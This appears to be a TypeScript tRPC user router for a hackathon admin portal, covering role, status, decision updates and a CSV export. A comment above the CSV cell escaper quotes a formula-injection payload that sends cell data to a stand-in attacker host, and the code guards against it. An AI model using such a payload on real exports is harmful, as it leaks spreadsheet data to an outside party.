import { z } from 'zod';
import { TRPCError } from '@trpc/server';
import { Role, UserStatus, DecisionStatus, InvitationStatus } from '$lib/generated/prisma/client';
import { router, authedProcedure, adminProcedure } from '../init';
import { resolveRecipientWhere, recipientFilterSchema } from '$lib/server/recipients';
import { logAction, valueOrNone } from '$lib/server/log';
import { TEAM_MEMBER_SELECT, SELF_USER_SELECT } from '$lib/server/trpc/selects';

/**
 * One CSV cell, safe to open in a spreadsheet.
 *
 * Two separate problems, both handled here so no export path can forget one:
 *
 * Quoting is unconditional. A comma stored in any field — a name, a university —
 * silently shifts every column after it, and "which fields can contain a comma"
 * is not a question worth re-answering per column.
 *
 * The leading apostrophe is the formula-injection guard. Excel and Sheets treat a
 * cell opening with `=`, `+`, `-`, or `@` as a formula, so an applicant who names
 * themselves `=HYPERLINK("https://evil.example?d="&A1,"click")` gets code running
 * against the roster the moment an admin opens the file. The apostrophe forces
 * the cell to be read as text and is stripped by the spreadsheet on display.
 */
function csvCell(value: string | null | undefined): string {
	const raw = value ?? '';
	// `\t` and `\r` are formula triggers too: Excel treats a cell starting with either
	// (before an `=`/`+`/`-`/`@`) as a formula, so they belong in the neutralization set.
	const neutralized = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw;
	return `"${neutralized.replace(/"/g, '""')}"`;
}

export const userRouter = router({
	me: authedProcedure.query(async ({ ctx }) => {
		// Explicit `select`, never `include`: this is `authedProcedure`, so the nested
		// team members and invitees are *other people*. An `include` would return their
		// full rows — email, status, and the embargoed `pendingDecision` — to any hacker.
		// See $lib/server/trpc/selects for why each projection is shaped as it is.
		return ctx.prisma.user.findUniqueOrThrow({
			where: { uid: ctx.user.uid },
			select: {
				...SELF_USER_SELECT,
				team: {
					select: {
						id: true,
						teamName: true,
						inviteCode: true,
						members: { select: TEAM_MEMBER_SELECT },
						invitations: {
							where: { status: InvitationStatus.PENDING },
							select: { id: true, email: true, user: { select: TEAM_MEMBER_SELECT } }
						}
					}
				},
				invitations: {
					where: { status: InvitationStatus.PENDING },
					select: {
						id: true,
						email: true,
						team: {
							select: {
								id: true,
								teamName: true,
								members: { select: TEAM_MEMBER_SELECT }
							}
						}
					}
				}
			}
		});
	}),

	list: adminProcedure
		.input(
			recipientFilterSchema.extend({
				page: z.number().int().min(1).default(1),
				pageSize: z.number().int().min(1).max(200).default(50)
			})
		)
		.query(async ({ ctx, input }) => {
			const { page, pageSize, ...filters } = input;

			// Shared with email.sendCustom / previewRecipients so the count an admin
			// sees and the set that actually gets mailed can never diverge — including
			// the typo-tolerant search, which is resolved to explicit names here rather
			// than being re-derived per procedure.
			const { where, expansion } = await resolveRecipientWhere(ctx.prisma, filters);

			const [total, users] = await Promise.all([
				ctx.prisma.user.count({ where }),
				ctx.prisma.user.findMany({
					where,
					skip: (page - 1) * pageSize,
					take: pageSize,
					orderBy: { createdAt: 'desc' }
				})
			]);

			// `search` reports when the exact term matched nobody and these rows are
			// near-misses instead, and when that suggestion list hit its cap — a
			// truncated list is a different answer and the UI should be able to say so.
			return { users, total, page, pageSize, search: expansion };
		}),

	getById: adminProcedure.input(z.object({ uid: z.string() })).query(async ({ ctx, input }) => {
		return ctx.prisma.user.findUniqueOrThrow({
			where: { uid: input.uid },
			include: {
				// Answers come back in `question.order` — the order the applicant was asked
				// them in, which is the only order they read correctly in. Sorted here rather
				// than in each consumer so a second reader of this payload can't disagree
				// with the first about what "the application" looks like.
				application: { include: { question: true }, orderBy: { question: { order: 'asc' } } },
				team: { include: { members: true } },
				scans: { orderBy: { timestamp: 'desc' } }
			}
		});
	}),

	/**
	 * Set an account's role. Singular, and that is the whole point: roles are mutually
	 * exclusive, so this replaces rather than adds. Granting someone ORGANIZER takes
	 * away their HACKER role in the same statement, and with it their hacker portal —
	 * see `$lib/auth/permissions` for why the two populations are disjoint.
	 */
	updateRole: adminProcedure
		.input(z.object({ uid: z.string(), role: z.nativeEnum(Role) }))
		.mutation(async ({ ctx, input }) => {
			// Read first so the audit entry can record what the role *was*. "Ali changed
			// Sarah's role to HACKER" answers half the question an audit gets opened to
			// answer; the other half is what it changed from.
			const before = await ctx.prisma.user.findUniqueOrThrow({
				where: { uid: input.uid },
				select: { name: true, role: true }
			});

			// Don't let the platform be left with no admin. Moving someone off ADMIN is
			// refused unless another admin remains — otherwise a self-demotion (or a
			// mis-click) locks everyone out of the admin portal with recovery only via the
			// database. `adminProcedure` already proves the caller is currently an admin.
			//
			// Exclusive roles make this guard matter more, not less: an admin who takes the
			// HACKER role no longer keeps admin alongside it, so what used to be an additive
			// edit is now a demotion.
			const losingAdmin = before.role === Role.ADMIN && input.role !== Role.ADMIN;
			if (losingAdmin) {
				const otherAdmins = await ctx.prisma.user.count({
					where: { role: Role.ADMIN, uid: { not: input.uid } }
				});
				if (otherAdmins === 0) {
					throw new TRPCError({
						code: 'BAD_REQUEST',
						message: 'This is the last admin — grant another account admin before removing it.'
					});
				}
			}

			const user = await ctx.prisma.user.update({
				where: { uid: input.uid },
				data: { role: input.role }
			});

			await logAction(ctx, {
				action: 'user.roles.update',
				summary: `Changed ${user.name}'s role to ${input.role}`,
				target: { id: user.uid, label: user.name },
				metadata: { from: before.role, to: input.role }
			});

			return user;
		}),

	updateStatus: adminProcedure
		.input(z.object({ uid: z.string(), status: z.nativeEnum(UserStatus) }))
		.mutation(async ({ ctx, input }) => {
			const before = await ctx.prisma.user.findUniqueOrThrow({
				where: { uid: input.uid },
				select: { status: true }
			});

			const user = await ctx.prisma.user.update({
				where: { uid: input.uid },
				data: { status: input.status }
			});

			await logAction(ctx, {
				action: 'user.status.update',
				summary: `Changed ${user.name}'s status to ${input.status}`,
				target: { id: user.uid, label: user.name },
				metadata: { from: before.status, to: input.status }
			});

			return user;
		}),

	/**
	 * Manual pending-decision override from /admin/users.
	 *
	 * Intentionally NOT guarded by the admissions review lock — this is the escape
	 * hatch if a claim ever wedges. It does clear the claim, so the applicant stops
	 * showing as "being reviewed" once overridden.
	 *
	 * `activeDecision` is deliberately NOT settable here. An active decision is one
	 * the applicant has already been emailed; writing it directly would change what
	 * the system believes without changing what the person was told, and this path
	 * sends nothing. The supported way to alter a published outcome is to set a new
	 * pending decision and release it, which notifies them. Enforced at the input
	 * schema rather than only hidden in the UI — an endpoint that still accepts the
	 * field is still a way to do the thing we decided nobody should do.
	 *
	 * Once an applicant has been released, this endpoint stops accepting decision
	 * edits entirely: `release` clears `pendingDecision`, so a released applicant is
	 * meant to sit at "no pending decision" rather than be edited back and forth
	 * behind an outcome they have already been told.
	 *
	 * Be aware this is currently the last UI path to a released decision. The
	 * admissions queue loads with `noDecision: true`, which matches only applicants
	 * with no decision of either kind, so released ones do not appear there to be
	 * re-decided. `admissions.setDecision` still accepts them, but no screen calls
	 * it for a released applicant — changing one means widening that queue first.
	 */
	updateDecisions: adminProcedure
		.input(
			z.object({
				uid: z.string(),
				pendingDecision: z.nativeEnum(DecisionStatus).nullable()
			})
		)
		.mutation(async ({ ctx, input }) => {
			const before = await ctx.prisma.user.findUniqueOrThrow({
				where: { uid: input.uid },
				select: { pendingDecision: true, activeDecision: true }
			});

			// A released applicant is off-limits here, whatever the payload says. Thrown
			// rather than silently ignored: an admin who somehow got the control enabled
			// should be told their edit did not happen, not left believing it did.
			if (before.activeDecision !== null) {
				throw new TRPCError({
					code: 'CONFLICT',
					message: 'This decision has already been released and can no longer be changed here.'
				});
			}

			// Reattribute only on a real change. /admin/users saves role, status and
			// decisions in one Promise.all, so this mutation fires on every save with
			// the decision field echoed back unchanged — stamping `decidedBy`
			// unconditionally would let an unrelated role edit quietly take credit for
			// a decision someone else made.
			const decisionChanged = before.pendingDecision !== input.pendingDecision;

			// Nothing is released at this point (guarded above), so clearing the pending
			// decision leaves nobody accountable and the attribution goes with it.
			const attribution = !decisionChanged
				? undefined
				: input.pendingDecision !== null
					? { decidedBy: ctx.user.uid, decidedAt: new Date() }
					: { decidedBy: null, decidedAt: null };

			const user = await ctx.prisma.user.update({
				where: { uid: input.uid },
				data: {
					pendingDecision: input.pendingDecision,
					...attribution,
					claimedBy: null,
					claimedAt: null
				}
			});

			// Logged as an override rather than a decision: this path bypasses the
			// review lock and the release step, so it is exactly the kind of edit
			// someone will later want to find in the trail.
			await logAction(ctx, {
				action: 'user.decision.override',
				summary:
					`Overrode ${user.name}'s pending decision — ` +
					`${valueOrNone(before.pendingDecision)} to ${valueOrNone(input.pendingDecision)}`,
				target: { id: user.uid, label: user.name },
				// No `activeDecision` key: the guard above means it is always null here.
				metadata: {
					pendingFrom: before.pendingDecision,
					pendingTo: input.pendingDecision
				}
			});

			return user;
		}),

	exportCsv: adminProcedure.query(async ({ ctx }) => {
		const users = await ctx.prisma.user.findMany({
			orderBy: { createdAt: 'desc' }
		});

		// A query, but still logged: this is the one call that hands an admin every
		// applicant's name and email in a file, and "who pulled the list" is a
		// question the trail should be able to answer.
		await logAction(ctx, {
			action: 'user.export',
			summary: `Exported the user list (${users.length} users)`,
			metadata: { count: users.length }
		});

		const header = 'uid,name,email,role,status,pendingDecision,activeDecision,teamId,createdAt';
		const rows = users.map((u) =>
			[
				u.uid,
				u.name,
				u.email,
				u.role,
				u.status,
				u.pendingDecision ?? '',
				u.activeDecision ?? '',
				u.teamId ?? '',
				u.createdAt.toISOString()
			]
				.map(csvCell)
				.join(',')
		);

		return [header, ...rows].join('\n');
	})
});
